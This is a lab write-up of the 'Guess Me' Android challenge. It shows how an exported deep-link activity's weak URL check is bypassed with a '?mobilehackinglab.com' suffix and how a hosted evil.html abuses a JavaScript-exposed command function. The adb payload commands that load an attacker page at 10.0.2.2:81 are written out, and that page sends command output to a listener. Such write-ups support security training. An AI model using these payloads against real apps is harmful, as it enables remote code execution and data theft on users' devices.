We decompile the apk `com.mobilehackinglab.guessme.apk` with jadx. We check the manifest for an exported activity that has an `<intent-filter>` with:
- `android.intent.action.VIEW`
- The categories `DEFAULT` and `BROWSABLE`
- A `<data>` element defining a custom scheme/host (or web domain).

![](<./assets/Guess Me/20251120103026121-Guess%20Me.png>)

We find WebviewActivity. In order to exploit the deep link, we have to send an intent with a payload in the following form:

```
adb shell am start -W "[schema]://[host]/[path]?[queryparm]=[value]"
```

From the manifest we infer that:
- schema = "mhl"
- host = "mobilehackinglab"
  
To fuzz we try to send the command:

```
adb shell am start -W "mhl://mobilehackinglab"
```

On the emulator we see that it works:

![](<./assets/Guess Me/20251120103026177-Guess%20Me.png>)

Thus, we check the source code of the activity WebviewActivity to see if it accepts parameter of any kind:

![](<./assets/Guess Me/20251120103026228-Guess%20Me.png>)

The function handleDeepLink checks if the url is valid with the function isValidDeepLink, which checks that:
- scheme = "mhl" or Scheme = "https";
- host = "mobilehackinglab";
- if there is an "url" parameter that ends with "mobilehackinglab.com"
If the checks passes, then the value of the parameter "url" is loaded, otherwise the file index.html is loaded via webView (which is rendered in the previous screenshots).

Hence, if we send a payload with a valid url, like the following, webView fetches the website mobilehackinglab.com:
```
adb shell am start -W "mhl://mobilehackinglab/path?url=https://www.mobilehackinglab.com"
```


![](<./assets/Guess Me/20251120103026281-Guess%20Me.png>)

To exploit this we can craft a payload like this:

```
adb shell am start -W "mhl://mobilehackinglab/path?url=malicious_url/malicious_file?mobilehackinglab.com"
```

Causing a SSRF vulnerability, to achieve Remote Code Execution, we see that in the code there is a custom function getTime:

![](<./assets/Guess Me/20251120103026339-Guess%20Me.png>)

Which executes the string that is passed in input, this is used in index.html file to get the current date:

![](<./assets/Guess Me/20251120103026439-Guess%20Me.png>)

Therefore, we craft a malicious evil.html file which is almost identical to index.html, but with a malicious script that executes arbitrary commands and sends the result to our listening server.

![](<./assets/Guess Me/20251120103026487-Guess%20Me.png>)

Then we host a python listening server on 81 that accepts also POST request with this code

![](<./assets/Guess Me/20251120103026529-Guess%20Me.png>)

We send the malicious payload via the following intent command:

```
adb shell am start -W "mhl://mobilehackinglab/path?url=http://10.0.2.2:81/evil.html?mobilehackinglab.com"
```

We achieved RCE:

![](<./assets/Guess Me/20251120103026574-Guess%20Me.png>)

The URL decoded output:

![](<./assets/Guess Me/20251120103026619-Guess%20Me.png>)
## TLDR

In steps I did:  
﻿  
﻿1) Decompile the apk with jadx  
﻿2) check for exported activities in the manifest, find the vulnerable activity for deep link exploitation  
﻿3) understand scheme and host  
﻿4) check the vulnerable activity source code to understand how to redirect to malicious url  
﻿5) craft malicious evil.html and host it on listening server  
﻿6) send the malicious payload via adb command to start an activity with an intent